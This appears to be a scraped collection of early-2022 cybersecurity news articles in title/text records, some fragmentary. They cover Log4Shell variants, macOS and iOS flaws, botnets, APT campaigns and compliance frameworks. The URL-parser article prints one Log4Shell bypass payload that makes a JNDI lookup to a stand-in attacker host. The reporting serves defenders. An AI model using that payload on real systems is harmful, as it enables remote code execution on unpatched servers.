apps is the ease by which we can collaborate with colleagues, customers and business partners. Using apps like Workday, Salesforce, Slack, Google Workspace or Microsoft 365, we can share content and collaborate with others with very little friction.\nBut this interconnectivity also significantly amplifies the impact of any user errors or attacks. Whether an employee accidentally shares a document with the wrong person or a compromised account extracts information, data now moves at lightning speed. As we head into 2022, with hybrid and remote work cemented as the new norm, Lookout expects this to become an even bigger issue.\n3 — Converging technologies to bring threat hunting to a new level\nOne of the steps organizations need to take to tackle evolving threats is to leverage threat hunting, also known as detection and response. The requirement for this is quickly becoming recognized, including with the U.S. government. I’m encouraged by the fact that the U.S. Office of Management and Budget (OBM) provided funding guidance for federal agencies to adopt detection and response capabilities.\nTo operationalize threat hunting in 2022, Lookout expects organizations will look into integrated endpoint-to-cloud security solutions that are cloud-delivered. With everyone working from anywhere and using unmanaged devices and networks, there are an unprecedented number of entities and communications for security teams to track. When security technologies converge in the cloud, organizations can take advantage of storage and computing power that on-premises tools never had. Security teams can also leverage security insights in a single place, enabling them to hunt for threats or conduct forensic investigations proactively.\n4 — DLP to become center of cloud-delivered cybersecurity\nData loss prevention (DLP) has traditionally been deployed as a standalone tool tethered to an enterprise’s perimeter data exchange points. This isn’t how things work anymore. Data now flows freely between clouds, endpoints and other entities — not just enterprise managed, but also with partners and contractors. To regain control, organizations need full visibility into how their data is handled regardless of where the users are and what device and network they’re using.\nLookout predicts that organizations will accelerate the move to cloud-delivered solutions where data protection, inclusive of DLP and enterprise digital rights management (E-DRM), are at the heart of it. More and more enterprises will look for advanced DLP capabilities such as exact data match (EDM) and optical character recognition (OCR) to keep abreast of all the new workflows. Only by tapping into the scalability and power of the cloud can security solutions ensure that data is protected efficiently without hindering productivity.\nIs 2022 the beginning of the end for on-premises security?\nNearly two years after most organizations were forced to experiment with remote work, 2022 will be an inflection point for both threats and cybersecurity solutions. With increased interconnectivity comes heightened security gaps, such as software supply chain vulnerabilities and data leakage. But this also means an accelerated adoption of integrated, cloud-delivered security solutions that enables proactive threat hunting and advanced data protection.\nOn-premises security tools that are deployed in isolation are no longer enough, even for on-premises workloads. To tackle the ever-evolving challenges of a cloud-first world, organizations need to invest in an integrated platform that can secure their data from endpoint to cloud. Join Lookout on their upcoming webinar on January 27th at 10 am GMT: 3 Steps to Protect Cloud Data in the Wake of the Pfizer Data Leak.\nTo learn more about how organizations should take advantage of the convergence of security technologies, download a complimentary copy of the “2021 Gartner Strategic Roadmap for SASE Convergence.“\n\n\nFound this article interesting?

{'title': 'Microsoft Details macOS Bug That Could Let Attackers Gain Access to User Data',
'text': 'Microsoft on Monday disclosed details of a recently patched security vulnerability in Apple’s macOS operating system that could be weaponized by a threat actor to expose users’ personal information.\nTracked as CVE-2021-30970, the flaw concerns a logic issue in the Transparency, Consent and Control (TCC) security framework, which enables users to configure the privacy settings of their apps and provide access to protected files and app data. The Security & Privacy pane in the macOS System Preferences app serves as the front end of TCC.\nMicrosoft 365 Defender Research Team, which reported the vulnerability to Apple on July 15, 2021, dubbed the flaw “powerdir.“ Apple addressed the issue as part of macOS 11.6 and 12.1 updates released in December 2021 with improved state management.\n\nWhile Apple does enforce a policy that limits access to TCC to only apps with full disk access, it’s possible to orchestrate an attack wherein a malicious application could work around its privacy preferences to retrieve sensitive information from the machine, potentially allowing an adversary to access microphone to record private conversations or capture screenshots of sensitive information displayed on the user’s screen.\n“We discovered that it is possible to programmatically change a target user’s home directory and plant a fake TCC database, which stores the consent history of app requests,“ Jonathan Bar Or of Microsoft 365 Defender Research Team said. “If exploited on unpatched systems, this vulnerability could allow a malicious actor to potentially orchestrate an attack based on the user’s protected personal data.“\n\nIn other words, if a bad actor gains full disk access to the TCC databases, the intruder could edit it to grant arbitrary permissions to any app of their choice, including their own, effectively permitting the app run with configurations previously not consented to.\n\nCVE-2021-30970 is also the third TCC-related bypass vulnerability to be discovered after CVE-2020-9934 and CVE-2020-27937, both of which have since been remediated by Apple. Then in May 2021, the company also patched a then zero-day flaw in the same component (CVE-2021-30713) that could allow an attacker to gain full disk access, screen recording, or other permissions without users’ explicit consent.\n“This shows that even as macOS or other operating systems and applications become more hardened with each release, software vendors like Apple, security researchers, and the larger security community, need to continuously work together to identify and fix vulnerabilities before attackers can take advantage of them,“ Bar Or said.\n\n\nFound this article interesting?

{'title': 'Researchers Find Bugs in Over A Dozen Widely Used URL Parser Libraries',
'text': 'A study of 16 different Uniform Resource Locator (URL) parsing libraries has unearthed inconsistencies and confusions that could be exploited to bypass validations and open the door to a wide range of attack vectors.\nIn a deep-dive analysis jointly conducted by cybersecurity firms Claroty  and Synk, eight security vulnerabilities were identified in as many third-party libraries written in C, JavaScript, PHP, Python, and Ruby languages and used by several web applications.\n“The confusion in URL parsing can cause unexpected behavior in the software (e.g., web application), and could be exploited by threat actors to cause denial-of-service conditions, information leaks, or possibly conduct remote code execution attacks,“ the researchers said in a report shared with The Hacker News.\nWith URLs being a fundamental mechanism by which resources — located either locally or on the web — can be requested and retrieved, differences in how the parsing libraries interpret a URL request could pose significant risk for users.\n\nA case in point is the critical Log4Shell flaw disclosed last month in the ubiquitous Log4j logging framework, which stems from the fact that a malicious attacker-controlled string, when evaluated as and when it’s being logged by a vulnerable application, results in a JNDI lookup that connects to an adversary-operated server and executes arbitrary Java code.\nAlthough the Apache Software Foundation (ASF) quickly put in a fix to address the weakness, it soon emerged that the mitigations could be bypassed by a specially crafted input in the format “${jndi:ldap://127.0.0[.]1#.evilhost.com:1389/a}“ that once again permits remote JNDI lookups to achieve code execution.\n“This bypass stems from the fact that two different (!) URL parsers were used inside the JNDI lookup process, one parser for validating the URL, and another for fetching it, and depending on how each parser treats the Fragment portion (#) of the URL, the Authority changes too,“ the researchers said.\n\nSpecifically, if the input is treated as a regular HTTP URL, the Authority component — the combination of the domain name and the port number — ends upon encountering the fragment identifier, whereas, when treated as an LDAP URL, the parser would assign the whole “127.0.0[.]1#.evilhost.com:1389“ as the Authority since the LDP URL specification doesn’t account for the fragment.\nIndeed, the use of multiple parsers emerged as one of the two primary reasons why the eight vulnerabilities were discovered, the other being issues arising from inconsistencies when the libraries follow different URL specifications, effectively introducing an exploitable loophole.\nThe dissonance ranges from confusion involving URLs containing backslashes (“\“), irregular number of slashes (e.g., https:///www.example[.]com), or URL encoded data (“%“) to URLs with missing URL schemes that, when successfully exploited, could lead to remote code execution or result in denial-or-service (DoS) and open-redirect phishing attacks.\n\nThe list of eight vulnerabilities discovered are as follows, all of which have since been addressed by respective maintainers —\nBelledonne’s SIP Stack (C, CVE-2021-33056)Video.js (JavaScript, CVE-2021-23414)Nagios XI (PHP, CVE-2021-37352)Flask-security (Python, CVE-2021-23385)Flask-security-too (Python, CVE-2021-32618)Flask-unchained (Python, CVE-2021-23393)Flask-User (Python, CVE-2021-23401)Clearance (Ruby, CVE-2021-23435)\n“Many real-life attack scenarios could arise from different parsing primitives,“ the researchers said. To protect applications from URL parsing vulnerabilities, “it is necessary to fully understand which parsers are involved in the whole process [and] the differences between parsers, be it their leniency, how they interpret different malformed URLs, and what types of URLs they support.“\n\n\nFound this article interesting?

'text': 'New research into the infrastructure behind an emerging DDoS botnet named Abcbot has uncovered “clear“ links with a cryptocurrency-mining botnet attack that came to light in December 2020.\nAttacks involving Abcbot, first disclosed by Qihoo 360’s Netlab security team in November 2021, are triggered via a malicious shell script that targets insecure cloud instances operated by cloud service providers such as Huawei, Tencent, Baidu, and Alibaba Cloud to download malware that co-opts the machine to a botnet, but not before terminating processes from competing threat actors and establishing persistence.\nThe shell script in question is itself an iteration of an earlier version originally discovered by Trend Micro in October 2021 hitting vulnerable ECS instances inside Huawei Cloud.\n\nBut in an interesting twist, continued analysis of the botnet by mapping all known Indicators of Compromise (IoCs), including IP addresses, URLs, and samples, has revealed Abcbot’s code and feature-level similarities to that of a cryptocurrency mining operation dubbed Xanthe that exploited incorrectly-configured Docker implementations to propagate the infection.\n\n“The same threat actor is responsible for both Xanthe and Abcbot and is shifting its objective from mining cryptocurrency on compromised hosts to activities more traditionally associated with botnets, such as DDoS attacks,“ Cado Security’s Matt Muir said in a report shared with The Hacker News.\nThe semantic overlaps between the two malware families range from how the source code is formatted to the names given to the routines, with some functions not only sporting identical names and implementation (e.g., “nameservercheck“) but also having the word “go“ appended to the end of the function names (e.g., “filerungo“).\n“This could indicate that the Abcbot version of the function has been iterated on several times, with new functionality added at each iteration,“ Muir explained.\n\nFurthermore, the deep-dive examination of the malware artifacts revealed the botnet’s capability to create as many as four users of their own by using generic, inconspicuous names like “autoupdater,“ “logger,“ “sysall,“ and “system“ to avoid detection, and adding them to the sudoers file to give the rogue users administrative powers over the infected system.\n“Code reuse and even like-for-like copying is often seen between malware families and specific samples on any platform,“ Muir said. “It makes sense from a development perspective; just as code for legitimate software is reused to save development time, the same occurs with illegitimate or malicious software.“\n\n\nFound this article interesting?

{'title': 'BADNEWS! Patchwork APT Hackers Score Own Goal in Recent Malware Attacks',
'text': 'Threat hunters have shed light on the tactics, techniques, and procedures embraced by an Indian-origin hacking group called Patchwork as part of a renewed campaign that commenced in late November 2021, targeting Pakistani government entities and individuals with a research focus on molecular medicine and biological science.\n“Ironically, all the information we gathered was possible thanks to the threat actor infecting themselves with their own [remote access trojan], resulting in captured keystrokes and screenshots of their own computer and virtual machines,“ Malwarebytes Threat Intelligence Team said in a report published on Friday.\nProminent victims that were successfully infiltrated include Pakistan’s Ministry of Defense, National Defence University of Islamabad, Faculty of Bio-Sciences at UVAS Lahore, International Center for Chemical and Biological Sciences (ICCBS), H.E.J. Research Institute of Chemistry, and the Salim Habib University (SBU).\n\nBelieved to have been active since 2015, Patchwork APT is also tracked by the wider cybersecurity community under the monikers Dropping Elephant, Chinastrats (Kaspersky), Quilted Tiger (CrowdStrike), Monsoon (Forcepoint), Zinc Emerson, TG-4410 (SecureWorks), and APT-C-09 (Qihoo 360).\nThe espionage group, primarily known for striking diplomatic and government agencies in Pakistan, China, U.S. think tanks, and other targets located in the Indian subcontinent via spear-phishing campaigns, gets its name from the fact that most of the code used for its malware tooling was copied and pasted from various sources publicly available on the web.\n\n“The code used by this threat actor is copy-pasted from various online forums, in a way that reminds us of a patchwork quilt,“ researchers from the now-defunct Israeli cybersecurity startup Cymmetria noted in its findings published in July 2016.\nOver the years, successive covert operations staged by the actor have attempted to drop and execute QuasarRAT as well as an implant named BADNEWS that acts as a backdoor for the attackers, providing them with full control over the victim machine. In January 2021, the threat group was also observed exploiting a remote code execution vulnerability in Microsoft Office (CVE-2017-0261) to deliver payloads on victim machines.\n\nThe latest campaign is no different in that the adversary lures potential targets with RTF documents impersonating Pakistani authorities that ultimately act as a conduit for deploying a new variant of the BADNEWS trojan called Ragnatela — meaning “spider web“ in Italian — enabling the operators to execute arbitrary commands, capture keystrokes and screenshots, list and upload files, and download additional malware.\n\nThe new lures, which purport to be from the Pakistan Defence Officers Housing Authority (DHA) in Karachi, contains an exploit for Microsoft Equation Editor that’s triggered to compromise the victim’s computer and execute the Ragnatela payload.\nBut in what’s a case of OpSec failure, the threat actor also ended up infecting their own development machine with the RAT, as Malwarebytes was able to unmask a number of its tactics, including the use of dual keyboard layouts (English and Indian) as well as the adoption of virtual machines and VPNs such as VPN Secure and CyberGhost to conceal their IP address.\n“While they continue to use the same lures and RAT, the group has shown interest in a new kind of target,“ the researchers concluded. “Indeed, this is the first time we have observed Patchwork targeting molecular medicine and biological science researchers.“\n\n\nFound this article interesting?

{'title': 'Facebook Launches ’Privacy Center’ to Educate Users on Data Collection and Privacy Options',
'text': 'Meta Platforms, the company formerly known as Facebook, on Friday announced the launch of a centralized Privacy Center that aims to “educate people“ about its approach with regards to how it collects and processes personal information across its family of social media apps.\n“Privacy Center provides helpful information about five common privacy topics: sharing, security, data collection, data use and ads,“ the social technology firm said in a press release.\nThe first module, Security, will offer easy access to common tools such as account security settings and two-factor authentication. Sharing will provide specifics about post visibility and settings to archive or trash old posts. Collection and Use will give users a quick glance into the type of data Meta harvests and learn how and why it’s used, respectively. Lastly, the Ads section will furnish information regarding a user’s ad preferences.\nThe learning hub is expected to be initially limited to a small pool of people using Facebook on desktop in the U.S., with plans to roll it out to a broader set of users and more of its apps in the coming months. Users part of the pilot will be able to access Privacy Center by navigating to Settings and Privacy on the desktop version of Facebook.\n\nPrivacy Center joins a plethora of other tools already offered by the tech giant, including Privacy Shortcuts and Privacy Checkup, both of which guide users through some of the privacy and security settings on the platform and review their choices. Where the new feature differs is that it hopes to serve as a one-stop place to navigate the myriad privacy and security controls available across Facebook, Instagram, and WhatsApp.\nOver the years, Facebook’s privacy controls have emerged as a magnet for controversy for being confusing to the point of not being useful enough to protect users’ data, not least driven by labyrinthine menus and obtuse wording that are designed to push users away from making privacy-friendly choices on its service.\n\nThe so-called “dark patterns“ — subtly coercive user interface design — came under the spotlight in June 2018, when a report by the Norwegian Consumer Council, titled Deceived by Design, revealed how “default settings and dark patterns, techniques and features of interface design meant to manipulate users, are used to nudge users towards privacy intrusive options.“\nIn punishing users for choosing privacy over sharing, the report called out Facebook and Google’s “privacy intrusive default settings, misleading wording, giving users an illusion of control, hiding away privacy-friendly choices, take-it-or-leave-it choices, and choice architectures where choosing the privacy friendly option requires more effort for the users.“\nA subsequent study of Facebook’s desktop user interface undertaken by researchers from the University of Bremen in March 2021 noted that “the way in which Facebook handles control over privacy settings sets an example for a novel dark pattern,“ adding by “placing all privacy settings behind several interface layers, Facebook actively offers a well designed but incomplete alternative to handle them.“\n\n\nFound this article interesting?

'text': 'The digital security team at the U.K. National Health Service (NHS) has raised the alarm on active exploitation of Log4Shell vulnerabilities in unpatched VMware Horizon servers by an unknown threat actor to drop malicious web shells and establish persistence on affected networks for follow-on attacks.\n“The attack likely consists of a reconnaissance phase, where the attacker uses the Java Naming and Directory InterfaceTM (JNDI) via Log4Shell payloads to call back to malicious infrastructure,“ the non-departmental public body said in an alert. “Once a weakness has been identified, the attack then uses the Lightweight Directory Access Protocol (LDAP) to retrieve and execute a malicious Java class file that injects a web shell into the VM Blast Secure Gateway service.“\n\nThe web shell, once deployed, can serve as a conduit to carry out a multitude of post-exploitation activities such as deploying additional malicious software, data exfiltration, or deployment of ransomware. VMware Horizon versions 7.x and 8.x are vulnerable to the Log4j vulnerabilities.\n\nLog4Shell is an exploit for CVE-2021-44228 (CVSS score: 10.0), a critical arbitrary remote code execution flaw in Apache Log4j 2, an ubiquitous open-source logging framework, which has been put to use as part of different malware campaigns since it came to light in December 2021. An array of hacking groups, ranging from nation-state actors to ransomware cartels, have pounced on the vulnerability to date.\n\nThe development also marks the second time VMware products have come under exploitation stemming as a result of vulnerabilities in the Log4j library. Last month, AdvIntel researchers disclosed that attackers were targeting systems running VMware VCenter servers with the aim of installing Conti ransomware.\nVMware, for its part, has already released security updates for Horizon, VCenter, and other products last month that have been impacted by Log4Shell, with the virtualization services provider acknowledging scanning attempts in the wild, urging customers to install the patches where applicable or apply workarounds temporarily to counter any potential risk.\n\n\nFound this article interesting?

'text': 'Researchers have disclosed a security flaw affecting H2 database consoles that could result in remote code execution in a manner that echoes the Log4j “Log4Shell“ vulnerability that came to light last month.\nThe issue, tracked as CVE-2021-42392, is the “first critical issue published since Log4Shell, on a component other than Log4j, that exploits the same root cause of the Log4Shell vulnerability, namely JNDI remote class loading,“ JFrog researchers Andrey Polkovnychenko and Shachar Menashe said.\n\nH2 is an open-source relational database management system written in Java that can be embedded within applications or run in a client-server mode. According to the Maven Repository, the H2 database engine is used by 6,807 artifacts.\nJNDI, short for Java Naming and Directory Interface, refers to an API that provides naming and directory functionality for Java applications, which can use the API in conjunction with LDAP to locate a specific resource that it might need.\n\nIn the case of Log4Shell, this feature enables runtime lookups to servers, both inside and outside the network, which, in turn, can be weaponized to allow unauthenticated remote code execution and implant malware on the server by crafting a malicious JNDI lookup as input to any Java application that uses vulnerable versions of the Log4j library to log it.\n“Similar to the Log4Shell vulnerability uncovered in early December, attacker-controlled URLs that propagate into JNDI lookups can allow unauthenticated remote code execution, giving attackers sole control over the operation of another person or organization’s systems,“ Menashe, senior director of JFrog security research, explained.\n\nThe flaw affects H2 database versions 1.1.100 to 2.0.204 and has been addressed in version 2.0.206 shipped on January 5, 2022.\n“The H2 database is used by many third-party frameworks, including Spring Boot, Play Framework and JHipster,“ Menashe added. “While this vulnerability is not as widespread as Log4Shell, it can still have a dramatic impact on developers and production systems if not addressed accordingly.“\n\n\nFound this article interesting?

You have to laugh. pic.twitter.com/5b6cpQ2Usd— Mark Di Stefano (@MarkDiStef) January 6, 2022 \nThis dark pattern affects the freedom of consent, the data protection agency said, adding the fact that users don’t have a better choice when it comes to rejecting cookies as easily as they can accept them steers their choice in favor of consent.\nAlong with imposing monetary penalties against Google and Meta, the CNIL has also ordered the tech giants to alter how they currently present cookie choices and provide users in the country with a simple means of refusing cookies within three months, or risk facing further fines of €100,000 per day of delay.\n\nWhile the fines won’t make much of a dent in either company’s revenues, this is not the first time European authorities have acted to punish Big Tech for contravening E.U. regulations. In December 2020, the regulator levied Google €100 million and Amazon Europe €35 million for having placed advertising cookies on users’ devices without seeking their prior consent.\nThen in November 2021, Italy’s competition authority, the Autorità Garante della Concorrenza e del Mercato (AGCM), fined Apple and Google €10 million each for not providing clear and immediate information on the acquisition and use of user data for commercial purposes during the account creation phase.\n\n\nFound this article interesting?

'text': 'A North Korean cyberespionage group named Konni has been linked to a series of targeted attacks aimed at the Russian Federation’s Ministry of Foreign Affairs (MID) with New Year lures to compromise Windows systems with malware.\n“This activity cluster demonstrates the patient and persistent nature of advanced actors in waging multi-phased campaigns against perceived high-value networks,“ researchers from Lumen Technologies’ Black Lotus Labs said in an analysis shared with The Hacker News.\nThe Konni group’s tactics, techniques, and procedures (TTPs) are known to overlap with threat actors belonging to the broader Kimsuky umbrella, which is also tracked by the cybersecurity community under the monikers Velvet Chollima, ITG16, Black Banshee, and Thallium.\n\nThe most recent attacks involved the actor gaining access to the target networks through stolen credentials, exploiting the foothold to load malware for intelligence gathering purposes, with early signs of the activity documented by MalwareBytes as far back as July 2021.\nSubsequent iterations of the phishing campaign are believed to have unfolded in three waves — the first commencing on October 19, 2021 to harvest credentials from MID personnel, followed by leveraging COVID-19 themed lures in November to install a rogue version of the Russian-mandated vaccination registration software that served as a loader for additional payloads.\n\n“The timing of this activity closely aligned with the passage of Russian Vaccine Passport laws that mandated Russians had to receive a QR code from the government to prove vaccination in order to access public places such as restaurants and bars,“ the researchers noted.\nThe third attack, also corroborated by Cluster25 earlier this week, began on December 20, 2021, using New Year’s Eve festivities as a spear-phishing theme to trigger a multi-stage infection chain that culminated in the installation of a remote access trojan named Konni RAT.\n\nSpecifically, the intrusions transpired by first compromising the email account belonging to a staff member of the MID, from which emails were sent to at least two other MID entities, including the Russian Embassy in Indonesia and Sergey Alexeyevich Ryabkov, a deputy minister overseeing non-proliferation and arms control.\nThe email missives seemingly propagated a “Happy New Year’s“ message, only to contain a trojanized screensaver attachment that’s designed to retrieve and run next-stage executables from a remote server. The final stage of the attack is the deployment of the Konni RAT trojan, which conducts reconnaissance of the infected machine and exfiltrates the collected information back to the server.\n“While this particular campaign was highly targeted, it is vital for defenders to understand the evolving capabilities of advanced actors to achieve infection of coveted targets,“ the researcher said, urging organizations to watch out for phishing emails and use multi-factor authentication to secure accounts.\n\n\nFound this article interesting?

{'title': 'NIST Cybersecurity Framework: A Quick Guide for SaaS Security Compliance',
'text': 'When I want to know the most recently published best practices in cyber security, I visit The National Institute of Standards and Technology (NIST). From the latest password requirements (NIST 800-63) to IoT security for manufacturers (NISTIR 8259), NIST is always the starting point. NIST plays a key role as a US standard-setter, due to the organization’s professionalism and the external experts who help to create NIST documents.\nThe NIST Cybersecurity Framework (CSF) was initially released in 2014 and last updated in 2018. The framework enables organizations to improve the security and resilience of critical infrastructure with a well-planned and easy-to-use framework.\nThe continuing growth in SaaS, and the major changes to the work environment due to COVID-19 bring new security challenges. Although the CSF was written and updated while SaaS was on the rise, it is still geared towards the classic legacy critical infrastructure security challenges. However, organizations can better respond to new risks by adapting the CSF to modern, SaaS-based work environments.\nI personally love this Framework, but truth be told, when one reads the Framework in-depth, its complexity is apparent, and following it can be difficult. This article will review the CSF’s key elements, point out its key merits, and suggest implementations for SaaS security. \nLearn how to automate your organization’s NIST compliance\nOverview of NIST CSF\nThe NIST CSF lays out five functions of security, then splits them into categories and subcategories. The subcategories contain the actual controls. For each subcategory, the CSF includes a list of cross-references to well-known standards and frameworks such as ISO 27001, COBIT, NIST SP 800-53, and ANSI/ISA-62443. \nThese cross-references help organizations implement the CSF and map it to other frameworks. For example, security managers or other team members can use the references to justify their decisions no matter what security standard the company needs to comply with.\nIn a single document, the Framework combines a host of approaches to dealing with cyber security threats. This includes: \nsetting up procedures training defining roles auditing monitoring \nThe framework has a five-stage core structure: Identify, Protect, Detect, Respond and Recover. I’m going to break them down into bullets for you. \n\nIdentify\nNIST defines this function as follows:\n“Develop the organizational understanding to manage cybersecurity risk to systems, assets, data, and capabilities.“ \nWithin this function, NIST includes the following control categories: \nAsset Management Business EnvironmentGovernanceRisk AssessmentRisk Management StrategySupply Chain Risk Management.\nProtect \nNIST defines this function as follows:\n“Develop and implement the appropriate safeguards to ensure delivery of critical infrastructure services.“ \nWithin this function, NIST includes the following control categories:\nAccess ControlAwareness and TrainingData SecurityInformation Protection Processes and ProceduresMaintenance Protective Technology\nDetect \nNIST defines this function as follows:\n“Develop and implement the appropriate activities to identify the occurrence of a cybersecurity event“. \nWithin this function, NIST includes the following control categories:\nAnomalies and Events Security Continuous Monitoring Detection Processes\nRespond \nNIST defines this function as follows:\n“Develop and implement the appropriate activities to take action regarding a detected cybersecurity event“. \nWithin this function, NIST includes the following control categories: \nResponse Planning Communications Analysis Mitigation Improvements\nRecover \nNIST defines this function as follows:\n“Develop and implement the appropriate activities to maintain plans for resilience and to restore any capabilities or services that were impaired due to a cybersecurity event“. \nWithin this function, NIST includes the following control categories:\nRecovery Planning Improvements Communications\nApplying the CSF to SaaS Security\nWhile definitely a model in best practices, the Framework is a challenge to implement. \nLearn more how a SaaS Security Posture Management (SSPM) solution can automate compliance to NIST across your SaaS estate.\nData-in-transit is protected (PR.DS-2)\nA company using SaaS services may wonder how this is relevant for them. They may think that compliance is the SaaS provider’s responsibility. However, a deeper look into it shows that many SaaS providers have security measures in place, and the user is responsible for using them. \nFor example, admins should not allow any connections via HTTP to a SaaS service. They should only allow secure HTTPS connections.\nProtections against data leaks are implemented (PR.DS-5)\nThis may seem like a small subcategory, but underneath there is a behemoth. Data leaks are extremely difficult to prevent. SaaS application adoption makes this harder because people can share and access them from anywhere in the world. \nAn admin or member of the CISO office should take special care of this threat. DLP in SaaS can include security measures such as: \nsharing links to files rather than the actual file setting an expiration date for the link disabling the download option if not neededblocking the ability to export data in data analysis SaaSuser authentication hardening prevention of locale recording in communication SaaS well-defined user roles with a limited number of super users and admins \nIdentities and credentials are issued, managed, verified, revoked, and audited for authorized devices, users and processes (PR.AC-1)\nAs an enterprise scales its workforce and SaaS adoption, this subcategory becomes more challenging. Managing 50,000 users over just five SaaS means that the security team needs to manage 250,000 identities. This problem is real and complicated.\nEven more challenging, each SaaS has a different way to define identities, view them, and secure identities. Adding to the risk, SaaS applications don’t always integrate with each other, which means users can find themselves with different privileges across different systems. This then leads to unnecessary privileges that can create a potential security risk. \nHow Adaptive Shield Can Help Meet NIST CSF Requirements\nThe NIST CSF is an industry-standard for cybersecurity today, yet to implement it with typical manual practices and processes is an uphill battle. So why not automate?\nAdaptive Shield is a SaaS Security Posture Management (SSPM) solution that can automate the compliance and configuration checks across the SaaS estate. Adaptive Shield enables security teams to easily see and fix configuration weaknesses quickly, ensuring compliance with company and industry standards, from NIST CSF, as well as other compliance mandates such as SOC 2 and the CSA Cloud Controls Matrix. \nNote: This article is written by Hananel Livneh, Senior Product Analyst at Adaptive Shield.\n\n\nFound this article interesting?

{'title': 'New Trick Could Let Malware Fake iPhone Shutdown to Spy on Users Secretly',
'text': 'Researchers have disclosed a novel technique by which malware on iOS can achieve persistence on an infected device by faking its shutdown process, making it impossible to physically determine if an iPhone is off or otherwise.\nThe discovery — dubbed “NoReboot“ — comes courtesy of mobile security firm ZecOps, which found that it’s possible to block and then simulate an iOS rebooting operation, deceiving the user into believing that the phone has been powered off when, in reality, it’s still running.\nThe San Francisco-headquartered company called it the “ultimate persistence bug […] that cannot be patched because it’s not exploiting any persistence bugs at all — only playing tricks with the human mind.“\nNoReboot works by interfering with the routines used in iOS to shutdown and restart the device, effectively preventing them from ever happening in the first place and allowing a trojan to achieve persistence without persistence as the device is never actually turned off.\n\nThis is accomplished by injecting specially crafted code onto three iOS daemons, namely the InCallService, SpringBoard, and Backboardd, to feign a shut down by disabling all audio-visual cues associated with a powered-on device, including the screen, sounds, vibration, the camera indicator, and touch feedback.\nPut differently, the idea is to give the impression that the device has been shut down without really shutting it down by hijacking the event that’s activated when the user simultaneously presses and holds the side button and one of the volume buttons, and drags the “slide to power off“ slider.\n\n“Despite that we disabled all physical feedback, the phone still remains fully functional and is capable of maintaining an active internet connection,“ the researchers explained. “The malicious actor could remotely manipulate the phone in a blatant way without worrying about being caught because the user is tricked into thinking that the phone is off, either being turned off by the victim or by malicious actors using ’low battery’ as an excuse.“\n\nThe malware strain then forces the SpingBoard, which refers to iOS’s graphical user interface, to exit (as opposed to the entire OS), followed by commanding the BackBoardd, the daemon that handles all touch and physical button click events, to display the Apple logo effect should the user opt to turn the running phone back on, while the malicious code continues to persist.\n\nWhat’s more, this technique could be theoretically extended to manipulate a force restart associated with an iPhone by deliberately causing the Apple logo to appear a few seconds earlier when such an event is recorded via the Backboardd, fooling the victim into releasing the side button without genuinely triggering a force restart.\nAlthough no malware to date has been detected or publicly documented using a method resembling NoReboot, the findings highlight that even the iOS restart process isn’t immune to being hijacked once an adversary has gained access to a target device, something that’s well within the reach of nation-state groups and cyber mercenaries alike.\n“Non-persistent threats achieved ’persistency’ without persistence exploits,“ the researchers concluded. A proof-of-concept (PoC) exploit demonstrating NoReboot can be accessed via GitHub here.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have taken the wraps of an organized financial-theft operation undertaken by a discreet actor to target transaction processing systems and siphon funds from entities primarily located in Latin America for at least four years.\nThe malicious hacking group has been codenamed Elephant Beetle by Israeli incident response firm Sygnia, with the intrusions aimed at banks and retail companies by injecting fraudulent transactions among benign activity to slip under the radar after an extensive study of the targets’ financial structures.\n“The attack is relentless in its ingenious simplicity serving as an ideal tactic to hide in plain sight, without any need to develop exploits,“ the researchers said in a report shared with The Hacker News, calling out the group’s overlaps with another tracked by Mandiant as FIN13, an “industrious“ threat actor linked to data theft and ransomware attacks in Mexico stretching back as early as 2016.\n\nElephant Beetle is said to leverage an arsenal of no fewer than 80 unique tools and scripts to execute its attacks, while simultaneously taking steps to blend in with the victim’s environment over long periods to achieve its objectives.\n“The unique modus operandi associated with the Elephant Beetle is their deep research and knowledge of victim’s financial systems and operations and their persistent search for vulnerable methods to technically inject financial transactions, ultimately leading to major financial theft,“ Arie Zilberstein, vice president of incident response at Sygnia, told The Hacker News. “Given the long period of persistence this group has in victim’s networks, they often change and adapt their techniques and tooling to continue to be relevant.“\n\nZilberstein attributed the success of the campaign to the vast attack surface provided by legacy systems that are present in financial institutions’ networks and can serve as entry points, thereby enabling attackers to gain a permanent foothold into target networks.\nThe adversary’s techniques and procedures follows a low-profile pattern that begins with planting backdoors to study the victim’s environment, specifically with an aim to understand the various processes used to facilitate financial transactions, followed by inserting rogue transactions of its own into the network that steal incremental amounts of money from the target to avoid setting off alarm.\n\nBut in the event the actor’s fraudulent actions come to light, they temporarily cease their operations only to return a few months later. The initial access is brokered by taking advantage of unpatched flaws in publicly-exposed Java-based web servers such as WebSphere and WebLogic, ultimately leading to the deployment of web shells that enable remote code execution and lateral movement —\nCVE-2017-1000486 (CVSS score: 9.8) - Primefaces Application Expression Language InjectionCVE-2015-7450 (CVSS score: 9.8) - WebSphere Application Server SOAP Deserialization ExploitCVE-2010-5326 (CVSS score: 10.0) - SAP NetWeaver Invoker Servlet ExploitEDB-ID-24963 - SAP NetWeaver ConfigServlet Remote Code Execution\nThe web shells, for their part, are fashioned as font, image, or CSS and JavaScript resources with a “.JSP“ extension to further long-term surveillance, while the operators also bank on a multitude of techniques that range from overwriting non-threatening files to replacing completely the default web page files (e.g., iisstart.aspx or default.aspx) on web servers to prepare for future attacks.\n“This attack emphasizes once again that sophisticated attackers are sometimes lurking in networks for [a] long time,“ Zilberstein said. “While a lot of emphasis is given today to avoiding and preventing the imminent risk of ransomware, some other threat actors are still operating to stealthily proliferate themselves in networks to get a long term and steady financial gain.“\n“Organizations need to pay extra attention to these systems, particularly those which are externally facing, and perform patching and continuous hunting to prevent and detect attacks of similar nature,“ Zilberstein added.\n\n\nFound this article interesting?

{'title': 'New Zloader Banking Malware Campaign Exploiting Microsoft Signature Verification',
